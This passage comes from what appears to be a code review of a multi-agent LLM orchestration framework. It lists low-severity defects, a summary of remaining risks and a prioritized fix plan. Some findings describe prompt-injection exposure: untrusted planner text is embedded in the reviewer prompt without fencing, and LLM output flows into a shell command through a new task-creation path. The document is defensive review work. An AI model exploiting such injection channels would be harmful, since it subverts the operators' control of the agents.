  while every sprint `bd` command runs on the orchestrator MEMBER -- two potentially
  different databases; the precondition can pass against a local DB and the sprint then
  fail (or worse, target a same-named issue) on the member's DB.
- Viewer port hardcoded to 8080 with no `error` handler on `server.listen` -- a port
  collision crashes the process before the sprint starts.

### N15. `'Orchestrator'` is a casing/enum stray of exactly the A2 class
**Severity: LOW**

`getMemberForRole('Orchestrator')` (runner.js:573) uses a capitalized, non-ROLES string;
every other call site uses canonical lowercase enum values, and `roleConst()` guards
only doer/reviewer. A `roleMap` author who writes `orchestrator: [...]` (matching the
documented lowercase convention) silently gets `physicalMembers[0]` instead. Same
mistake shape the wave's own comment block (runner.js:10-23) warns about.
Fix: add 'orchestrator' handling deliberately -- either to ROLES or as a documented
application-level pseudo-role -- and normalize roleMap keys via `normalizeRole()`.

### N16. The two unw.19 determinism fixes have no regression protection
**Severity: LOW (but undermines a headline claim)**

The sort-by-(title,id) fixes for `bd list --ready` order and review-phase
`assignedBeadIds` order (runner.js:806-807, 850-851, 979-984) were root-caused by the
golden test -- but the committed golden scenario is deliberately single-bead (its own
comment, golden-transcript.test.mjs:61-75), where every sort is a no-op. Reverting the
sort lines today passes the entire suite: the golden test can't see it (one bead), and
advanced-mock-runner-test's determinism check compares only agentType:label sequences
and final bead state, both order-insensitive at the prompt level. The fix is real; the
net that supposedly guards it is not.
Fix: add a 3-bead golden variant that snapshots ONLY the order-sensitive artifacts
(streak-assignment prompt text, reviewer prompt's bead-id list) rather than the full
dispatch order, sidestepping the genuine parallel-completion race the current test
rightly avoids.

### N17. Fenced-block preference can hide valid JSON
**Severity: LOW**

`extractStructuredOutput()` uses fenced blocks EXCLUSIVELY when any exist
(index.mjs:176): a reply containing one fenced code snippet (e.g. a doer quoting a shell
command in ``` fences) plus valid JSON OUTSIDE the fences never has that JSON considered
-- burning repair attempts (and, at exhaustion, failing the call) on output a human
would call obviously valid. Fix: try fenced candidates first, then FALL THROUGH to the
balanced scan of the remaining text instead of either/or.

### N18. Minor accumulations (grouped)
**Severity: LOW**

- `deferred` status is absent from `NOT_DONE_STATUSES` (runner.js:94): a goal-priority
  bead deferred mid-sprint (harvester defers issues per its contract) counts as done
  for the exit check.
- `VP` agent defs still instruct `bd remember ...` (doer.md:74, reviewer.md:118,
  integ-test-runner.md:128) -- plan.md's V4 parenthetical ("verify/replace upstream")
  remains unresolved on the vendor branch awaiting sign-off; the command fails
  member-side if `bd remember` doesn't exist, adding noise to every role run.
- Viewer: a `cancelled` terminal state renders as OFFLINE after the 5s server close
  (poll error path checks only success/failed, viewer/index.mjs:359).
- The reviewer prompt embeds raw `bd show --json` (planner-authored titles/
  descriptions) without `wrapUntrustedBlock`, unlike every other inter-agent text path
  -- inconsistent application of the A7 fencing rule (the injection risk is prompt-level
  only; ids interpolated into commands come from bd itself).
- Doer blind retry also re-runs after `AgentOutputError` (schema exhaustion), i.e. up to
  6 full LLM dispatches per streak per round -- correct for isolation, but a cost
  amplifier worth a per-error-type policy once budgets are real (N10).
- Replayed agent activities re-debit the run budget with the cached cost
  (index.mjs:571-573) -- defensible (total-spend view) but undocumented, and
  inconsistent with the fresh-run semantics of `budget.total` (a resumed run can trip
  the budget purely on replayed history).

---

## Part 3 -- Top-line summary

**Is the system meaningfully more reliable than at 14:21?** Yes -- substantially, and
not cosmetically. The framework's original disqualifiers (fabricated costs, no timeouts,
regex "sandbox", null-vs-throw roulette, dead tests) are genuinely gone; the failure
paths that used to be invisible now have typed errors, honest propagation, and
regression tests that reproduce the original failure modes rather than merely naming
them. The develop/review loop rebuild (unw.16) is the standout: verified closes, failure
isolation, orchestrator-applied transitions, and a provably-safe streak fallback. The
determinism story moved from "claimed" to "snapshot-asserted" for the single-bead path.

**But the center of gravity of risk has moved, not vanished.** The original review's
risks were inside the code; the remaining risks live at the SEAMS the per-issue,
scope-fenced remediation process could not see:

1. **Runner vs vendored role contracts (N1)** -- three independent, each-guaranteed-
   fatal divergences (tier convention, plan-reviewer scope, doer branch) between two
   halves that were each individually approved. This will fail every sprint the moment
   contract-obeying personas are live, and it is invisible to every current test because
   the mock personas obey the RUNNER, not the CONTRACTS.
2. **The vendor adapter's silent-fallback design (N2)** -- the rename has already broken
   the lookup path on the merged tree, and nothing will ever say so at runtime.
3. **Real-fleet topology assumptions (N4)** -- branch-ensure on one member, beads state
   assumed shared, git/gh mocked out -- the single largest gap between what the test net
   proves and what production will do.
4. **Injection re-entry through the new reviewer->bd create path (N3)** -- the one new
   LLM-output-to-shell channel added by the remediation itself.

**Second remediation round, in priority order:**
1. N1 + N13's tripwire test (contract alignment + `validateRoleInput`-based static
   check) -- before any submodule bump or member persona update.
2. N3 (newTasks shell injection) -- small, severe, self-contained.
3. N4 (multi-member branch/state model) -- decide and enforce the topology; until then,
   document single-member as the only supported real-fleet mode.
4. N2 (fallback observability + fixture-vs-vendor consistency test), folded into the
   pending contracts.mjs rename PR.
5. N5-N9 as a "second-order correctness" batch (replay failSoft shape, parallel replay
   keys, double activity:end, verdict lifecycle, stall oscillation) -- each small, all
   in code that will otherwise be trusted precisely because it now looks finished.

The first remediation round proved the team can fix what a review names. The remaining
work is mostly about building the checks that name cross-cutting drift automatically --
because the process that fixed F1-A7 (isolated issues, fenced scopes, per-PR adversarial
review) is structurally blind to exactly the class of defect that now dominates.

---

*Suite-run note:* during this review, both suites were executed and passed:
`packages/apra-fleet-workflow` `npm test` 86/86; `packages/apra-fleet-se` `npm test`
(advanced-mock-runner-test, then node --test: golden-transcript, contracts,
contracts-schema-loader, runner-arg-contract, viewer-extensions) 95/95, exit 0.
Every finding above is therefore a defect the green suite does not see -- which is
itself the theme of Part 3.
